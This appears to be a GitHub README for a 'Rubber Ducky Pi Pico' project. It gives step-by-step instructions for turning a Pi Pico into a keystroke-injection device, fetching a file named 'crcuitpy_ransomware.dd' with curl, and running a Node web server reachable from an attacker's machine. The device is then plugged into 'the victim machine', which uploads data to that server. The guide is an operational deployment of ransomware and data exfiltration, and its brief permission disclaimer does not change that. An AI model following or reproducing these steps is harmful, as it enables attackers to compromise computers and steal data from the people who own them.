# Rubber Ducky Pi Pico Setup and Payload Deployment

Welcome to the Rubber Ducky Pi Pico project! This guide will walk you through setting up your Rubber Ducky Pi Pico, downloading the payload from this repository, setting up the npm web server, and deploying the payload.

## Prerequisites

Before you begin, make sure you have the following:

- A Rubber Ducky Pi Pico device
- A computer to set up the web server
- Node.js installed on your computer

## Setup Instructions

### Step 1: Set Up Your Rubber Ducky Pi Pico

1. Connect your Rubber Ducky Pi Pico to your computer.
2. Follow the instructions for setting up the Pi Pico as a Rubber Ducky. You can find detailed instructions [here](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads).

### Step 2: Download the Payload

1. Download the payload file using the following command:
    ```sh
    curl -O https://raw.githubusercontent.com/harshilbadminton/ransomware/master/crcuitpy_ransomware.dd
    ```
2. Paste the `crcuitpy_ransomware.dd` file into the root directory of the Rubber Ducky Pi Pico and rename it to `payload.dd`.

### Step 3: Set Up the npm Web Server

1. Download the `web_server` folder from this repository.
2. Navigate to the `web_server` directory:
    ```sh
    cd web_server
    ```
3. Run the web server:
    ```sh
    node server.js
    ```
4. Ensure the web server is running on your desired IP address and port (default is `http://localhost:3000`).

### Step 4: Host the Website on RDP or Your Hacking Machine

1. Make sure your web server is accessible from the network. You may need to configure port forwarding or firewall settings to allow external access.
2. Test the web server by navigating to `http://<your-server-ip>:3000` in a web browser.

### Step 5: Deploy the Payload

1. Plug the Rubber Ducky Pi Pico into the victim machine.
2. The Pi Pico will execute the payload, which includes accessing your web server and uploading necessary data.

## Important Notes

- Always obtain permission before deploying any hacking tools or techniques on a machine you do not own.
- Misuse of these tools can result in severe consequences, including legal action.

## License

This project is licensed under the MIT License. See the LICENSE file for details.

## Contributing

Contributions are welcome! Please fork this repository and submit pull requests.

## Contact

For any questions or issues, please open an issue in this repository.
